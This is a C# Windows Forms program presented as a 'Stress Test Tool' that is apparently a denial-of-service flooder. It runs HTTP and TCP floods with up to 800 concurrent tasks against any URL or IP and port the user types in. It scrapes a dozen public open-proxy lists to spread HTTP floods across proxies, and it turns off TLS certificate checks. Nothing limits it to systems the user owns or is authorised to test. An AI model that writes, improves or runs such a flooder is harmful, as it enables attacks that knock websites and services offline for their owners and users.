using System;
using System.IO;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text.Json;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

public class StressTestForm : Form
{
    private const int MAX_THREADS = 800;
    private const int REQUESTS_PER_THREAD = 50;
    private const int TIMEOUT = 5000;
    private const double DELAY_MIN = 0.1;
    private const double DELAY_MAX = 0.3;
    private const int MAX_RETRIES = 5;

    private static bool stopTest = false;
    private static int requestCount = 0;
    private static List<string> results = new List<string>();
    private static HttpClient httpClient;

    private Button startButton;
    private Button stopButton;
    private TextBox targetUrlTextBox;
    private TextBox targetIpTextBox;
    private TextBox targetPortTextBox;
    private ComboBox testTypeComboBox;
    private Label requestCountLabel;
    private RichTextBox logBox;
    private Label targetUrlLabel;
    private Label targetIpLabel;
    private Label targetPortLabel;

    static StressTestForm()
    {
        ServicePointManager.DefaultConnectionLimit = MAX_THREADS;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
        var handler = new HttpClientHandler()
        {
            ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator,
            SslProtocols = System.Security.Authentication.SslProtocols.Tls12 | System.Security.Authentication.SslProtocols.Tls13
        };
        httpClient = new HttpClient(handler) { Timeout = TimeSpan.FromMilliseconds(TIMEOUT) };
    }

    public StressTestForm()
    {
        InitializeComponent();
    }

    private void InitializeComponent()
    {
        this.startButton = new Button();
        this.stopButton = new Button();
        this.targetUrlTextBox = new TextBox();
        this.targetIpTextBox = new TextBox();
        this.targetPortTextBox = new TextBox();
        this.testTypeComboBox = new ComboBox();
        this.requestCountLabel = new Label();
        this.logBox = new RichTextBox();
        this.targetUrlLabel = new Label();
        this.targetIpLabel = new Label();
        this.targetPortLabel = new Label();
        
        this.Text = "Stress Test Tool";
        this.Size = new System.Drawing.Size(500, 500);
        this.BackColor = System.Drawing.Color.Gray; 
        
        this.testTypeComboBox.Items.AddRange(new string[] { "http", "https", "tcp" });
        this.testTypeComboBox.Location = new System.Drawing.Point(20, 20);
        this.testTypeComboBox.SelectedIndex = 0;
        this.testTypeComboBox.BackColor = System.Drawing.Color.White; 
        this.testTypeComboBox.ForeColor = System.Drawing.Color.Red; 
        this.testTypeComboBox.FlatStyle = FlatStyle.Flat; 
        this.testTypeComboBox.Font = new System.Drawing.Font("Arial", 10, System.Drawing.FontStyle.Bold); 
        
        this.targetUrlLabel.Text = "Target URL:";
        this.targetUrlLabel.Location = new System.Drawing.Point(20, 60);
        this.targetUrlLabel.ForeColor = System.Drawing.Color.White;
        this.targetUrlLabel.Font = new System.Drawing.Font("Arial", 10, System.Drawing.FontStyle.Regular);

        this.targetUrlTextBox.Location = new System.Drawing.Point(100, 60);
        this.targetUrlTextBox.Size = new System.Drawing.Size(360, 20);
        this.targetUrlTextBox.BackColor = System.Drawing.Color.White;
        this.targetUrlTextBox.ForeColor = System.Drawing.Color.Red;
        this.targetUrlTextBox.BorderStyle = BorderStyle.FixedSingle; 
        this.targetUrlTextBox.Font = new System.Drawing.Font("Arial", 10, System.Drawing.FontStyle.Regular);
        
        this.targetIpLabel.Text = "Target IP:";
        this.targetIpLabel.Location = new System.Drawing.Point(20, 100);
        this.targetIpLabel.ForeColor = System.Drawing.Color.White;
        this.targetIpLabel.Font = new System.Drawing.Font("Arial", 10, System.Drawing.FontStyle.Regular);

        this.targetIpTextBox.Location = new System.Drawing.Point(100, 100);
        this.targetIpTextBox.Size = new System.Drawing.Size(360, 20);
        this.targetIpTextBox.BackColor = System.Drawing.Color.White;
        this.targetIpTextBox.ForeColor = System.Drawing.Color.Red;
        this.targetIpTextBox.BorderStyle = BorderStyle.FixedSingle;
        this.targetIpTextBox.Font = new System.Drawing.Font("Arial", 10, System.Drawing.FontStyle.Regular);

        this.targetPortLabel.Text = "Target Port:";
        this.targetPortLabel.Location = new System.Drawing.Point(20, 140);
        this.targetPortLabel.ForeColor = System.Drawing.Color.White;
        this.targetPortLabel.Font = new System.Drawing.Font("Arial", 10, System.Drawing.FontStyle.Regular);

        this.targetPortTextBox.Location = new System.Drawing.Point(100, 140);
        this.targetPortTextBox.Size = new System.Drawing.Size(360, 20);
        this.targetPortTextBox.BackColor = System.Drawing.Color.White;
        this.targetPortTextBox.ForeColor = System.Drawing.Color.Red;
        this.targetPortTextBox.BorderStyle = BorderStyle.FixedSingle;
        this.targetPortTextBox.Font = new System.Drawing.Font("Arial", 10, System.Drawing.FontStyle.Regular);
        
        this.startButton.Text = "Start Test";
        this.startButton.Location = new System.Drawing.Point(20, 180);
        this.startButton.Size = new System.Drawing.Size(150, 30);
        this.startButton.BackColor = System.Drawing.Color.Red;
        this.startButton.ForeColor = System.Drawing.Color.White;
        this.startButton.FlatStyle = FlatStyle.Flat;
        this.startButton.Font = new System.Drawing.Font("Arial", 12, System.Drawing.FontStyle.Bold);
        this.startButton.Click += StartButton_Click;

        this.stopButton.Text = "Stop Test";
        this.stopButton.Location = new System.Drawing.Point(200, 180);
        this.stopButton.Size = new System.Drawing.Size(150, 30);
        this.stopButton.BackColor = System.Drawing.Color.DarkRed;
        this.stopButton.ForeColor = System.Drawing.Color.White;
        this.stopButton.FlatStyle = FlatStyle.Flat;
        this.stopButton.Font = new System.Drawing.Font("Arial", 12, System.Drawing.FontStyle.Bold);
        this.stopButton.Click += StopButton_Click;

        this.requestCountLabel.Location = new System.Drawing.Point(20, 220);
        this.requestCountLabel.Size = new System.Drawing.Size(440, 20);
        this.requestCountLabel.ForeColor = System.Drawing.Color.White;
        this.requestCountLabel.Font = new System.Drawing.Font("Arial", 10, System.Drawing.FontStyle.Bold);
        
        this.logBox.Location = new System.Drawing.Point(20, 250);
        this.logBox.Size = new System.Drawing.Size(440, 180);
        this.logBox.BackColor = System.Drawing.Color.Black;
        this.logBox.ForeColor = System.Drawing.Color.Lime;
        this.logBox.Font = new System.Drawing.Font("Consolas", 10, System.Drawing.FontStyle.Regular);
        this.logBox.ReadOnly = true;

        this.Controls.Add(this.startButton);
        this.Controls.Add(this.stopButton);
        this.Controls.Add(this.targetUrlTextBox);
        this.Controls.Add(this.targetIpTextBox);
        this.Controls.Add(this.targetPortTextBox);
        this.Controls.Add(this.testTypeComboBox);
        this.Controls.Add(this.requestCountLabel);
        this.Controls.Add(this.logBox);
        this.Controls.Add(this.targetUrlLabel);
        this.Controls.Add(this.targetIpLabel);
        this.Controls.Add(this.targetPortLabel);
    }

    private async void StartButton_Click(object sender, EventArgs e)
    {
        string testType = testTypeComboBox.SelectedItem.ToString();
        string targetUrl = targetUrlTextBox.Text;
        string targetIp = targetIpTextBox.Text;
        int targetPort = int.TryParse(targetPortTextBox.Text, out int port) ? port : 0;

        stopTest = false;
        requestCount = 0;
        results.Clear();

        await StartStressTest(testType, targetUrl, targetIp, targetPort);
    }

    private void StopButton_Click(object sender, EventArgs e)
    {
        stopTest = true;
    }

    private async Task<List<string>> GetProxiesAsync()
    {
        var proxies = new List<string>();

        async Task FetchProxies(string url, string listName)
        {
            try
            {
                var response = await httpClient.GetStringAsync(url);
                var proxyList = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
                    .Select(proxy => $"http://{proxy.Trim()}")
                    .Where(proxy => !string.IsNullOrEmpty(proxy))
                    .ToList();
                proxies.AddRange(proxyList);
                Log($"The {listName} proxy list fetched successfully.");
            }
            catch (Exception e)
            {
                Log($"Error fetching {listName}: {e.Message}");
            }
        }

        await FetchProxies("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", "List6");
        await FetchProxies("https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt", "List7");
        await FetchProxies("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt", "List9");
        await FetchProxies("https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", "List13");
        await FetchProxies("http://rootjazz.com/proxies/proxies.txt", "List14");
        await FetchProxies("http://spys.me/proxy.txt", "List15");
        await FetchProxies("https://sheesh.rip/http.txt", "List16");
        await FetchProxies("http://worm.rip/http.txt", "List17");
        await FetchProxies("http://www.proxyserverlist24.top/feeds/posts/default", "List18");
        await FetchProxies("https://www.proxy-list.download/api/v1/get?type=http", "List19");
        await FetchProxies("https://www.proxyscan.io/download?type=http", "List20");
        await FetchProxies("https://www.my-proxy.com/free-anonymous-proxy.html", "List21");
        await FetchProxies("https://www.my-proxy.com/free-transparent-proxy.html", "List22");

        return proxies.Distinct().ToList();
    }

    private async Task Fetch(HttpClient client, string url, string proxy = null)
    {
        try
        {
            var response = await client.GetStringAsync(url);
            Log($"Successfully fetched data from {url}");
        }
        catch (Exception e)
        {
            Log($"Error fetching data from {url}: {e.Message}");
        }
    }

    private async Task HttpFlood(string targetUrl, string proxy)
    {
        try
        {
            while (!stopTest)
            {
                using (var httpClient = new HttpClient())
                {
                    var response = await httpClient.GetAsync(targetUrl);
                    Interlocked.Increment(ref requestCount);
                }
                await Task.Delay(TimeSpan.FromSeconds(new Random().NextDouble() * (DELAY_MAX - DELAY_MIN) + DELAY_MIN));
            }
        }
        catch (Exception e)
        {
            Log($"HTTP Flood error: {e.Message}");
        }
    }

    private async Task TcpFlood(string targetIp, int targetPort)
    {
        byte[] buffer = new byte[1024];
        new Random().NextBytes(buffer);
        while (!stopTest)
        {
            try
            {
                using (var tcpClient = new TcpClient())
                {
                    await tcpClient.ConnectAsync(targetIp, targetPort);
                    using (var stream = tcpClient.GetStream())
                    {
                        await stream.WriteAsync(buffer, 0, buffer.Length);
                        Interlocked.Increment(ref requestCount);
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"TCP Flood error: {ex.Message}");
            }
            await Task.Delay(TimeSpan.FromSeconds(new Random().NextDouble() * (DELAY_MAX - DELAY_MIN) + DELAY_MIN));
        }
    }

    private async Task StartStressTest(string testType, string targetUrl, string targetIp, int targetPort)
    {
        List<string> proxies = await GetProxiesAsync();
        if (testType == "http" || testType == "https")
        {
            if (!proxies.Any())
            {
                Log("Failed to get a proxy. Test canceled.");
                return;
            }
            List<Task> tasks = new List<Task>();
            foreach (var proxy in proxies)
            {
                tasks.Add(Task.Run(() => HttpFlood(targetUrl, proxy)));
            }
            await Task.WhenAll(tasks);
        }
        else if (testType == "tcp")
        {
            List<Task> tasks = new List<Task>();
            for (int i = 0; i < MAX_THREADS; i++)
            {
                tasks.Add(Task.Run(() => TcpFlood(targetIp, targetPort)));
            }
            await Task.WhenAll(tasks);
        }

        stopTest = true;
    }

    private void Log(string message)
    {
        if (logBox.InvokeRequired)
        {
            logBox.Invoke(new Action(() =>
            {
                logBox.AppendText($"{DateTime.Now}: {message}\n");
                logBox.ScrollToCaret();
            }));
        }
        else
        {
            logBox.AppendText($"{DateTime.Now}: {message}\n");
            logBox.ScrollToCaret();
        }
    }

    [STAThread]
    public static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new StressTestForm());
    }
}
